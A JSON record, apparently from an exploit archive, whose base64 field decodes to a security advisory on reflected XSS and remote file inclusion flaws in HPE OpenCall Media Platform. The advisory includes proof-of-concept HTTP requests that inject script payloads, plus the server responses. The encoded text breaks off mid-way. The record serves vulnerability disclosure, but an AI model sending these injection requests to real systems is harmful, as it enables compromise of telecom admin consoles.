{
    "source": "exploit-database", 
    "exploit": "U291cmNlOiBodHRwczovL2Jsb2dzLnNlY3VyaXRlYW0uY29tL2luZGV4LnBocC9hcmNoaXZlcy8zMDg3DQoNClNTRCBBZHZpc29yeSDigJMgSFBFIE9wZW5DYWxsIE1lZGlhIFBsYXRmb3JtIChPQ01QKSBNdWx0aXBsZSBWdWxuZXJhYmlsaXRpZXMNCg0KV2FudCB0byBnZXQgcGFpZCBmb3IgYSB2dWxuZXJhYmlsaXR5IHNpbWlsYXIgdG8gdGhpcyBvbmU/DQpDb250YWN0IHVzIGF0OiBzc2RAYmV5b25kc2VjdXJpdHkuY29tDQoNClZ1bG5lcmFiaWxpdGllcyBTdW1tYXJ5DQpUaGUgZm9sbG93aW5nIGFkdmlzb3J5IGRlc2NyaWJlcyBSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcgKFhTUykNCnZ1bG5lcmFiaWxpdGllcyBhbmQgYSBSZW1vdGUgRmlsZSBJbmNsdXNpb24gdnVsbmVyYWJpbGl0eSB0aGF0IHdoZW4NCmNvbWJpbmVkIGNhbiBsZWFkIHRvIENvZGUgRXhlY3V0aW9uLCB3ZXJlIGZvdW5kIGluIEhQIE9wZW5DYWxsIE1lZGlhDQpQbGF0Zm9ybSAoT0NNUCksIHZlcnNpb24gNC4zLjIuDQoNCkhQRSBPcGVuQ2FsbCBNZWRpYSBQbGF0Zm9ybSAoT0NNUCkgaXMgYSBzdWl0ZSBvZiBzb2Z0d2FyZSBhbmQgaGFyZHdhcmUNCmFwcGxpY2F0aW9ucyB3aGljaCBhbGxvdyBpbXBsZW1lbnRhdGlvbiBvZiBjb21tb24gdGVsZWNvbSBvcGVyYXRvcg0Kc2VydmljZXMgc3VjaCBhcyB2b2ljZW1haWwsIHNtcyAoc2hvcnQgbWVzc2FnZSBzZXJ2aWNlKSwgcHJlcGFpZCwNCmJpbGxpbmcsIGhsciwgZXRjLiBJdCBpbXBsZW1lbnRzIGluZHVzdHJ5IHN0YW5kYXJkIHRlbGVjb20gcHJvdG9jb2xzDQphbmQgc3RhbmRhcmRzIHN1Y2ggYXMgU1M3LCBJU1VQLCBUQ0FQLCBTSVAsIE1SQ1AsIFJUU1AsIGFuZCBWb2ljZVhNTC4NCg0KSFBFIE9wZW5DYWxsIE1lZGlhIFBsYXRmb3JtIG9mZmVycyBhIGhpZ2hseSBzY2FsYWJsZSwgZWFzeS10by1tYW5hZ2UsDQpjYXJyaWVyLWdyYWRlIG1lZGlhIHBsYXRmb3JtIHRoYXQgYWRhcHRzIHRvIGZ1dHVyZSBuZXR3b3JrcyBhbmQNCmFwcGxpY2F0aW9ucy4gVGhyb3VnaCBpdHMgc3Ryb25nIHN1cHBvcnQgb2Ygb3BlbiBzdGFuZGFyZHMgYW5kDQpwcm90b2NvbHMsIG5ldyBhcHBsaWNhdGlvbnMgY2FuIGJlIHJhcGlkbHkgZGV2ZWxvcGVkIGFuZCBkZXBsb3llZCBpbiBhDQp3YXkgdGhhdCBwcmVzZXJ2ZXMgaW52ZXN0bWVudHMgYW5kIHJlZHVjZXMgY2FwaXRhbCBleHBlbmRpdHVyZXMNCihDQVBFWCkgYW5kIG9wZXJhdGlvbmFsIGV4cGVuZGl0dXJlIChPUEVYKS4NCg0KVGhlcmUgYXJlIDMgZGlmZmVyZW50IGNvbXBvbmVudHMgdGhhdCBhcmUgdnVsbmVyYWJsZSBpbiBIUEUgT3BlbkNhbGwNCk1lZGlhIFBsYXRmb3JtIChPQ01QKSwgYW5kIGZvciBlYWNoIGNvbXBvbmVudCBoYXMgdGhlIGZvbGxvd2luZw0KdnVsbmVyYWJpbGl0aWVzOg0KDQpBcHBsaWNhdGlvbiBDb250ZW50IE1hbmFnZXINCg0KUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpIOKAkyAvbWNtL3Jlc291cmNlcy8NCg0KDQpQbGF0Zm9ybSBBZG1pbmlzdHJhdGlvbiBUb29sDQoNClJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKSB0aGF0IGxlYWQgdG8gUmVtb3RlIENvZGUgRXhlY3V0aW9uDQpSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcgKFhTUykg4oCTIEdldE1hcEFjdGlvbiBmdW5jdGlvbiwgTEVWX1RZUEUwIHBhcmFtZXRlcg0KUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpIOKAkyBHZXRNYXBBY3Rpb24gZnVuY3Rpb24sIExFVl9UWVBFMSBwYXJhbWV0ZXINClJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKSDigJMgR2V0TWFwQWN0aW9uIGZ1bmN0aW9uLCBMRVZfVFlQRTIgcGFyYW1ldGVyDQpSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcgKFhTUykg4oCTIEdldE1hcEFjdGlvbiBmdW5jdGlvbiwgTEVWX1RZUEUzIHBhcmFtZXRlcg0KUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpIOKAkyBHZXRNYXBBY3Rpb24gZnVuY3Rpb24sIExFVl9OQU1FMCBwYXJhbWV0ZXINClJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKSDigJMgR2V0TWFwQWN0aW9uIGZ1bmN0aW9uLCBMRVZfTkFNRTEgcGFyYW1ldGVyDQpSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcgKFhTUykg4oCTIEdldE1hcEFjdGlvbiBmdW5jdGlvbiwgTEVWX05BTUUyIHBhcmFtZXRlcg0KUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpIOKAkyBHZXRNYXBBY3Rpb24gZnVuY3Rpb24sIExFVl9OQU1FMyBwYXJhbWV0ZXINClJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKSDigJMgR2V0TWFwQWN0aW9uIGZ1bmN0aW9uDQpSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcgKFhTUykg4oCTIEdldE1hcEFjdGlvbiBmdW5jdGlvbiwgTEVWX05VTSBwYXJhbWV0ZXINClJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKSDigJMgR2V0TWFwQWN0aW9uIGZ1bmN0aW9uLCBOQU1FIHBhcmFtZXRlcg0KUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpIOKAkyBjZHJkaXNwYXRjaCBmdW5jdGlvbiwgbmV4dCBwYXJhbWV0ZXINClJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKSDigJMgY2RyZGlzcGF0Y2ggZnVuY3Rpb24sIHNlc3Npb25UeXBlIHBhcmFtZXRlcg0KDQoNClZvaWNlWE1MIEFkbWluaXN0cmF0aW9uIFRvb2wNCg0KUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpIOKAkyBldmVudC5kbyBmdW5jdGlvbg0KUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpIOKAkyBjYWxsLmRvIGZ1bmN0aW9uDQpSZW1vdGUgRmlsZSBJbmNsdXNpb24g4oCTIHByb3h5bGluay5kbyBmdW5jdGlvbg0KDQoNCkNyZWRpdA0KQW4gaW5kZXBlbmRlbnQgc2VjdXJpdHkgcmVzZWFyY2hlciBQYW9sbyBTdGFnbm8gZnJvbSBWb2lkU2VjIGhhcw0KcmVwb3J0ZWQgdGhpcyB2dWxuZXJhYmlsaXR5IHRvIEJleW9uZCBTZWN1cml0eeKAmXMgU2VjdXJpVGVhbSBTZWN1cmUNCkRpc2Nsb3N1cmUgcHJvZ3JhbS4NCg0KVmVuZG9yIFJlc3BvbnNlcw0KSFBFIGhhcyByZWxlYXNlZCBwYXRjaGVzIHRvIGFkZHJlc3MgdGhpcyB2dWxuZXJhYmlsaXR5LCBmb3IgbW9yZSBkZXRhaWxzIHNlZToNCmh0dHBzOi8vaDIwNTY0Lnd3dzIuaHBlLmNvbS9ocHNjL2RvYy9wdWJsaWMvZGlzcGxheT9kb2NJZD1lbXJfbmEtaHBlc2JnbjAzNjg2ZW5fdXMNCg0KVnVsbmVyYWJpbGl0aWVzIERldGFpbHMNCg0KQXBwbGljYXRpb24gQ29udGVudCBNYW5hZ2VyIOKAkyAvbWNtL3Jlc291cmNlcy8NCkhQRSBPcGVuQ2FsbCBNZWRpYSBQbGF0Zm9ybSAoT0NNUCkgZG9lcyBub3Qgc2FuaXRpemUgL21jbS9yZXNvdXJjZXMvDQrigJxkZXNjcmlwdGlvbuKAnSBhbmQg4oCccHJvdG90eXBl4oCdIHBhcmFtZXRlcnMgaW5wdXQuIEFuIGF0dGFja2VyIGNhbiBpbmplY3QNCm1hbGljaW91cyBKYXZhIHNjcmlwdCB0byB0cmlnZ2VyIHRoZSBSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcNCihYU1MpLg0KDQpQcm9vZiBvZiBDb25jZXB0DQoNCkFuIEF0dGFja2VyIHNlbmQgdGhlIGZvbGxvd2luZyBQT1NUIHJlcXVlc3QgdG8gdGhlIHZpY3RpbXMgbWFjaGluZSA6DQoNCg0KUE9TVCBodHRwczovLzEyNy4wLjAuMTo4NDQzL21jbS9yZXNvdXJjZXMvZHVtbXlfdGVzdC9kdW1teS90ZXN0P2ZvbGxvd2luZGlyZWN0aW9uPWZhbHNlDQpIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xOjg0NDMNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IHJ2OjQwLjApDQpHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQwLjANCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkROVDogMQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9tY20ranNvbjsgY2hhcnNldD1VVEYtOA0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vMTI3LjAuMC4xOjg0NDMvbWNtL3RlbmFudC9tY21jb250ZW50Lmh0bWwNCkNvbnRlbnQtTGVuZ3RoOiA1NA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUNCg0KeyAiIjogIiIsICJkZXNjcmlwdGlvbiI6ICI8c2NyaXB0PmFsZXJ0KDEpOzwvc2NyaXB0PiJ9DQoNClRoZSBzZXJ2ZXIgd2lsbCByZXNwb25kIHdpdGg6DQoNCkhUVFAvMS4xIDIwNCBObyBDb250ZW50DQpYLVBvd2VyZWQtQnk6IFNlcnZsZXQgMi41OyBKQm9zcy01LjAvSkJvc3NXZWItMi4xDQpEYXRlOiBXZWQsIDIzIFNlcCAyMDE1IDE2OjEzOjM1IEdNVA0KU2VydmVyOiBXZWIgU2VydmVyDQoNClRoZW4gdGhlIGF0dGFja2VyIHdpbGwgc2VuZCB0aGUgc2Vjb25kIHJlcXVlc3QgdG8gdHJpZ2dlciB0aGUNCkNyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpOg0KDQpHRVQgaHR0cHM6Ly8xMjcuMC4wLjE6ODQ0My9tY20vcmVzb3VyY2VzL2R1bW15X3Rlc3QvZHVtbXkvdGVzdD9mb3JtYXQ9anNvbiZmb2xsb3dpbmRpcmVjdGlvbj1mYWxzZSZtcz0xNDQzMDI0ODE1OTI0DQpIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xOjg0NDMNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IHJ2OjQwLjApDQpHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQwLjANCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkROVDogMQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vMTI3LjAuMC4xOjg0NDMvbWNtL3RlbmFudC9tY21jb250ZW50Lmh0bWwNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0KVGhlIHNlcnZlciB3aWxsIHJlc3BvbmQgd2l0aDoNCg0KSFRUUC8xLjEgMjAwIE9LDQpYLVBvd2VyZWQtQnk6IFNlcnZsZXQgMi41OyBKQm9zcy01LjAvSkJvc3NXZWItMi4xDQpDYWNoZS1jb250cm9sOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uDQpUcmFuc2Zlci1FbmNvZGluZzogY2h1bmtlZA0KRGF0ZTogV2VkLCAyMyBTZXAgMjAxNSAxNjoxMzozNSBHTVQNClNlcnZlcjogV2ViIFNlcnZlcg0KDQoNClZvaWNlWE1MIEFkbWluaXN0cmF0aW9uIFRvb2wg4oCTIGNhbGwuZG8gZnVuY3Rpb24NCkhQRSBPcGVuQ2FsbCBNZWRpYSBQbGF0Zm9ybSAoT0NNUCkgZG9lcyBub3Qgc2FuaXRpemUgY2FsbC5kbyBmdW5jdGlvbg0KcGFyYW1ldGVycyBpbnB1dC4gQW4gYXR0YWNrZXIgY2FuIGluamVjdCBtYWxpY2lvdXMgSmF2YSBzY3JpcHQgdG8NCnRyaWdnZXIgdGhlIFJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKS4NCg0KVGhlIHZ1bG5lcmFibGUgVVJMOiAvb20vY2FsbC5kbz9hY3Rpb249bGlzdF9jYWxscyZ0eXBlPVhTU19IRVJFDQoNClByb29mIG9mIENvbmNlcHQNCg0KQW4gQXR0YWNrZXIgc2VuZCB0aGUgZm9sbG93aW5nIEdFVCByZXF1ZXN0IHRvIHRoZSB2aWN0aW1zIG1hY2hpbmU6DQoNCkdFVCAvb20vY2FsbC5kbz9hY3Rpb249bGlzdF9jYWxscyZ0eXBlPUFjdGl2ZTYzN2EzPHNjcmlwdD5hbGVydCgxKTwlMmZzY3JpcHQ+YzdlOWYNCkhUVFAvMS4xDQpBY2NlcHQ6IHRleHQvaHRtbCwgYXBwbGljYXRpb24veGh0bWwreG1sLCAqLyoNClJlZmVyZXI6IGh0dHBzOi8vMTI3LjAuMC4xOjU0NDMvb20vc2VydmljZWdyb3VwLmRvP2FjdGlvbj1hZGRzZXJ2aWNlZ3JvdXANCkFjY2VwdC1MYW5ndWFnZTogZW4tR0INClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkhvc3Q6IDEyNy4wLjAuMTo1NDQzDQpETlQ6IDENCkNvbm5lY3Rpb246IEtlZXAtQWxpdmUNCkNvb2tpZTogSlNFU1NJT05JRD01RjkxOTYxMDdBMzQ1NDEzM0Q0MTkwQ0RCMDg2RTAzQg0KDQpUaGUgc2VydmVyIHdpbGwgcmVzcG9uZCB3aXRoOg0KDQpIVFRQLzEuMSAyMDAgT0sNClNlcnZlcjogQXBhY2hlLUNveW90ZS8xLjENClByYWdtYTogTm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLG5vLXN0b3JlDQpFeHBpcmVzOiBUaHUsIDAxIEphbiAxOTcwIDAxOjAwOjAwIEdNVA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUaHUsIDEwIFNlcCAyMDE1IDEzOjMwOjQxIEdNVA0KQ29udGVudC1MZW5ndGg6IDEwNDE4DQoNCg0KPEhUTUw+DQo8SEVBRD4NCjxUSVRMRT5Wb2ljZVhNTCBFbnZpcm9ubWVudCBPcGVyYXRpb24gYW5kIE1haW50ZW5hbmNlIG9uIHRiMG9jbXAwPC9USVRMRT4NCjxMSU5LIFJFTD0ic3R5bGVzaGVldCINCkhSRUY9ImNvbnNvbGVwYWdlcy90ZW1wbGF0ZXMvc3R5bGVzaGVldHMvc3R5bGUuY3NzIiBUWVBFPSJ0ZXh0L2NzcyI+DQo8L0hFQUQ+DQoNCjxCT0RZPg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KDQovL0hWIE1lbnUgdjUtIGJ5IEdlciBWZXJzbHVpcyAod3d3LmJ1cm1lZXMubmwpDQovL1N1Ym1pdHRlZCB0byBEeW5hbWljIERyaXZlICh3d3cuZHluYW1pY2RyaXZlLmNvbSkNCi8vVmlzaXQgd3d3LmR5bmFtaWNkcml2ZS5jb20gZm9yIHRoaXMgc2NyaXB0IGFuZCBtb3JlDQoNCmZ1bmN0aW9uIEdvKCl7cmV0dXJufQ0KDQo8L3NjcmlwdD4NCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ig0Kc3JjPSJjb25zb2xlcGFnZXMvdGVtcGxhdGVzL2pzL2V4bXBsbWVudV92YXIuanNwIj48L3NjcmlwdD4NCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ig0Kc3JjPSJjb25zb2xlcGFnZXMvdGVtcGxhdGVzL2pzL21lbnVfY29tLmpzIj48L3NjcmlwdD4NCjxub3NjcmlwdD5Zb3VyIGJyb3dzZXIgZG9lcyBub3Qgc3VwcG9ydCBzY3JpcHQ8L25vc2NyaXB0Pg0KDQo8VEFCTEUgV0lEVEg9IjgwMCIgQk9SREVSPSIwIj4NCjxUUj4NCjxURD48SU1HIFNSQz0iY29uc29sZXBhZ2VzL3RlbXBsYXRlcy9pbWFnZXMvc3BlZWNod2ViLmdpZiIvPjwvVEQ+DQo8L1RSPg0KPFRSPg0KDQo8VEQgVkFMSUdOPSJ0b3AiPg0KTG9nZ2VkIG9uIGFzOiB6ZXJwc3RhMSA8U1BBTiBpZD0id2FybiI+ICZuYnNwOyAmbmJzcDsgJm5ic3A7ICZuYnNwOw0KJm5ic3A7ICZuYnNwOyAmbmJzcDsgJm5ic3A7ICAgICAgPC9TUEFOPg0KPEJSPjxCUj48QlI+PEJSPg0KDQoNCjxicj4NCjxiPkNhbGwgTWFuYWdlbWVudCAtPiBBY3RpdmU2MzdhMzxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD5jN2U5ZiBDYWxsczwvYj4NCg0KPGJyPjxicj48YnI+DQoNCjx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMDAwIj4NCjx0cj48dGQgY29sc3Bhbj0iMTIiIGNsYXNzPSJ0YWJsZWhlYWRlciI+Q2FsbHMgPGEgaHJlZj0iIyI+PGltZw0Kc3JjPSJjb25zb2xlcGFnZXMvdGVtcGxhdGVzL2ltYWdlcy9xdWVzdGlvbm1hcmsuZ2lmIiBib3JkZXI9IjAiDQpvbkNsaWNrPSJ3aW5kb3cub3BlbignaGVscC5kbz9wcm9tcHQ9cDIwJywgJ2hlbHAnLA0KJ3Rvb2xiYXI9bm8sd2lkdGg9NDAwLGhlaWdodD00MDAscmVzaXphYmxlPW5vLHNjcm9sbGJhcnM9eWVzJyk7Ij48L2E+PC90ZD48L3RyPg0KPHRyPjx0ZCBjb2xzcGFuPSIxMiI+Jm5ic3A7PC90ZD48L3RyPg0KPHRyPg0KPHRkPjxiPjxhIGhyZWY9Y2FsbC5kbz9hY3Rpb249c29ydF9jYWxscyZ0eXBlPW5vZGU+U2VydmVyIElkPC9hPjwvYj48L3RkPg0KPHRkPjxiPjxhIGhyZWY9Y2FsbC5kbz9hY3Rpb249c29ydF9jYWxscyZ0eXBlPWNhbGxpZD5DYWxsSWQ8L2E+PC9iPjwvdGQ+DQo8dGQ+PGI+Q0RSPC9iPjwvdGQ+DQo8dGQ+PGI+Q2FsbCBNb25pdG9yaW5nPC9iPjwvdGQ+DQo8dGQ+PGI+U2VydmljZSBJZDwvYj48L3RkPg0KPHRkPjxiPjxhIGhyZWY9Y2FsbC5kbz9hY3Rpb249c29ydF9jYWxscyZ0eXBlPXJ1cmk+UmVtb3RlLVVSSTwvYT48L2I+PC90ZD4NCjx0ZD48Yj48YSBocmVmPWNhbGwuZG8/YWN0aW9uPXNvcnRfY2FsbHMmdHlwZT1sdXJpPkxvY2FsLVVSSTwvYT48L2I+PC90ZD4NCjx0ZD48Yj48YSBocmVmPWNhbGwuZG8/YWN0aW9uPXNvcnRfY2FsbHMmdHlwZT1zZXZlcmU+U2V2ZXJlczwvYT48L2I+PC90ZD4NCjx0ZD48Yj48YSBocmVmPWNhbGwuZG8/YWN0aW9uPXNvcnRfY2FsbHMmdHlwZT13YXJuaW5nPldhcm5pbmdzPC9hPjwvYj48L3RkPg0KPHRkPjxiPjxhIGhyZWY9Y2FsbC5kbz9hY3Rpb249c29ydF9jYWxscyZ0eXBlPXZ4bWxfZXhjZXB0aW9uPlZvaWNlWE1MDQpFeGNlcHRpb25zPC9hPjwvYj48L3RkPg0KPHRkPjxiPjxhIGhyZWY9Y2FsbC5kbz9hY3Rpb249c29ydF9jYWxscyZ0eXBlPXRpbWU+U3RhcnRlZCBBdDwvYT48L2I+PC90ZD4NCg0KPHRkPjxiPkR1cmF0aW9uPC9iPjwvdGQ+DQoNCg0KPC90cj4NCg0KDQoNCiAgICA8dHIgYmdjb2xvcj0iZWVlZWVlIj4NCg0KICAgIDx0ZD50YjBvY21wMTwvdGQ+DQoNCiAgICA8dGQ+PGEgaHJlZj0icHJveHlsaW5rLmRvP3VybD1odHRwcyUzQSUyRiUyRnRiMG9jbXAxJTNBNTQ0MyUyRm1pdCUyRmxvZ3MlMkZjYWxsaWRzJTJGdnhpX2RpYWxvZ18wXzMyXzYzNF8zJTNGbXVsdGlub2RlVXNlciUzRG9jYWRtaW4lMjZjbHVzdGVySUQlM0Q3QTJDODdFRDdENzlFRTc2NDQyODdDM0I0MTUxRkIxMyZjb250ZW50dHlwZT10ZXh0L2h0bWwiDQp0YXJnZXQ9Il9uZXciPnZ4aV9kaWFsb2dfMF8zMl82MzRfMzwvYT48L3RkPg0KDQogICAgPHRkPjxhIGhyZWY9InByb3h5bGluay5kbz91cmw9aHR0cHMlM0ElMkYlMkZ0YjBvY21wMSUzQTU0NDMlMkZtaXQlMkZzeXN0ZW0lMkZjZHIlMkZ2eGlfZGlhbG9nXzBfMzJfNjM0XzMlM0ZtdWx0aW5vZGVVc2VyJTNEb2NhZG1pbiUyNmNsdXN0ZXJJRCUzRDdBMkM4N0VEN0Q3OUVFNzY0NDI4N0MzQjQxNTFGQjEzIg0KdGFyZ2V0PSJfbmV3Ij5DRFI8L2E+PC90ZD4NCiAgICA8dGQ+PGEgaHJlZj0iY2FsbC5kbz9hY3Rpb249bW9uaXRvciZjaWQ9dnhpX2RpYWxvZ18wXzMyXzYzNF8zJm5vZGU9dGIwb2NtcDEiPk1vbml0b3I8L2E+PC90ZD4NCg0KICAgIDx0ZD48YSBocmVmPSJzZXJ2aWNlLmRvP2FjdGlvbj11cGRhdGUmaWQ9bzJfaXZyXzB4eHgiPm8yX2l2cl8weHh4PC9hPjwvdGQ+DQoNCiAgICA8dGQ+c2lwOnVuYXZhaWxhYmxlQHVua25vd24uaW52YWxpZDwvdGQ+DQogICAgPHRkPisxNTQyMDAwNDcwNTIxMTIzPC90ZD4NCiAgICA8dGQ+PGEgaHJlZj1ldmVudC5kbz9hY3Rpb249bGlzdCZjYWxsaWQ9dnhpX2RpYWxvZ18wXzMyXzYzNF8zJnR5cGU9RVJST1INCnRhcmdldD0ibmV3Ij4xPC9hPjwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ZXZlbnQuZG8/YWN0aW9uPWxpc3QmY2FsbGlkPXZ4aV9kaWFsb2dfMF8zMl82MzRfMyZ0eXBlPVdBUk4NCnRhcmdldD0ibmV3Ij4wPC9hPjwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ZXZlbnQuZG8/YWN0aW9uPWxpc3QmY2FsbGlkPXZ4aV9kaWFsb2dfMF8zMl82MzRfMyZ0eXBlPXZ4bWxfZXhjZXB0aW9uDQp0YXJnZXQ9Im5ldyI+MjE8L2E+PC90ZD4NCiAgICA8dGQ+MTUwOTA5IDE5OjAwOjUyLjQyOTwvdGQ+PHRkPjAwOjAwOjAwLjUwMjwvdGQ+DQoNCiAgICA8L3RyPg0KDQoNCiAgICA8dHI+DQoNCiAgICA8dGQ+dGIwb2NtcDA8L3RkPg0KDQogICAgPHRkPjxhIGhyZWY9InByb3h5bGluay5kbz91cmw9aHR0cHMlM0ElMkYlMkZ0YjBvY21wMCUzQTU0NDMlMkZtaXQlMkZsb2dzJTJGY2FsbGlkcyUyRnZ4aV9kaWFsb2dfMF80MF80MjBfMiUzRm11bHRpbm9kZVVzZXIlM0RvY2FkbWluJTI2Y2x1c3RlcklEJTNEN0EyQzg3RUQ3RDc5RUU3NjQ0Mjg3QzNCNDE1MUZCMTMmY29udGVudHR5cGU9dGV4dC9odG1sIg0KdGFyZ2V0PSJfbmV3Ij52eGlfZGlhbG9nXzBfNDBfNDIwXzI8L2E+PC90ZD4NCg0KICAgIDx0ZD48YSBocmVmPSJwcm94eWxpbmsuZG8/dXJsPWh0dHBzJTNBJTJGJTJGdGIwb2NtcDAlM0E1NDQzJTJGbWl0JTJGc3lzdGVtJTJGY2RyJTJGdnhpX2RpYWxvZ18wXzQwXzQyMF8yJTNGbXVsdGlub2RlVXNlciUzRG9jYWRtaW4lMjZjbHVzdGVySUQlM0Q3QTJDODdFRDdENzlFRTc2NDQyODdDM0I0MTUxRkIxMyINCnRhcmdldD0iX25ldyI+Q0RSPC9hPjwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ImNhbGwuZG8/YWN0aW9uPW1vbml0b3ImY2lkPXZ4aV9kaWFsb2dfMF80MF80MjBfMiZub2RlPXRiMG9jbXAwIj5Nb25pdG9yPC9hPjwvdGQ+DQoNCiAgICA8dGQ+PGEgaHJlZj0ic2VydmljZS5kbz9hY3Rpb249dXBkYXRlJmlkPW8yX2l2cl8weHh4Ij5vMl9pdnJfMHh4eDwvYT48L3RkPg0KDQogICAgPHRkPnNpcDp1bmF2YWlsYWJsZUB1bmtub3duLmludmFsaWQ8L3RkPg0KICAgIDx0ZD4rMTU0MjAwMDQ3MDE3NDAyMzwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ZXZlbnQuZG8/YWN0aW9uPWxpc3QmY2FsbGlkPXZ4aV9kaWFsb2dfMF80MF80MjBfMiZ0eXBlPUVSUk9SDQp0YXJnZXQ9Im5ldyI+MTwvYT48L3RkPg0KICAgIDx0ZD48YSBocmVmPWV2ZW50LmRvP2FjdGlvbj1saXN0JmNhbGxpZD12eGlfZGlhbG9nXzBfNDBfNDIwXzImdHlwZT1XQVJODQp0YXJnZXQ9Im5ldyI+MDwvYT48L3RkPg0KICAgIDx0ZD48YSBocmVmPWV2ZW50LmRvP2FjdGlvbj1saXN0JmNhbGxpZD12eGlfZGlhbG9nXzBfNDBfNDIwXzImdHlwZT12eG1sX2V4Y2VwdGlvbg0KdGFyZ2V0PSJuZXciPjIxPC9hPjwvdGQ+DQogICAgPHRkPjE1MDkwOCAxOToyOTowNS4yMzY8L3RkPjx0ZD4wMDowMDowMC41MDE8L3RkPg0KDQogICAgPC90cj4NCg0KDQogICAgPHRyIGJnY29sb3I9ImVlZWVlZSI+DQoNCiAgICA8dGQ+dGIwb2NtcDE8L3RkPg0KDQogICAgPHRkPjxhIGhyZWY9InByb3h5bGluay5kbz91cmw9aHR0cHMlM0ElMkYlMkZ0YjBvY21wMSUzQTU0NDMlMkZtaXQlMkZsb2dzJTJGY2FsbGlkcyUyRnZ4aV9kaWFsb2dfMF8zMl82MzRfMiUzRm11bHRpbm9kZVVzZXIlM0RvY2FkbWluJTI2Y2x1c3RlcklEJTNEN0EyQzg3RUQ3RDc5RUU3NjQ0Mjg3QzNCNDE1MUZCMTMmY29udGVudHR5cGU9dGV4dC9odG1sIg0KdGFyZ2V0PSJfbmV3Ij52eGlfZGlhbG9nXzBfMzJfNjM0XzI8L2E+PC90ZD4NCg0KICAgIDx0ZD48YSBocmVmPSJwcm94eWxpbmsuZG8/dXJsPWh0dHBzJTNBJTJGJTJGdGIwb2NtcDElM0E1NDQzJTJGbWl0JTJGc3lzdGVtJTJGY2RyJTJGdnhpX2RpYWxvZ18wXzMyXzYzNF8yJTNGbXVsdGlub2RlVXNlciUzRG9jYWRtaW4lMjZjbHVzdGVySUQlM0Q3QTJDODdFRDdENzlFRTc2NDQyODdDM0I0MTUxRkIxMyINCnRhcmdldD0iX25ldyI+Q0RSPC9hPjwvdGQ+DQogICAgPHRkPjxhIGhyZWY9ImNhbGwuZG8/YWN0aW9uPW1vbml0b3ImY2lkPXZ4aV9kaWFsb2dfMF8zMl82MzRfMiZub2RlPXRiMG9jbXAxIj5Nb25pdG9yPC9hPjwvdGQ+DQoNCiAgICA8dGQ+PGEgaHJlZj0ic2VydmljZS5kbz9hY3Rpb249dXBkYXRlJmlkPW8yX2l2cl8weHh4Ij5vMl9pdnJfMHh4eDwvYT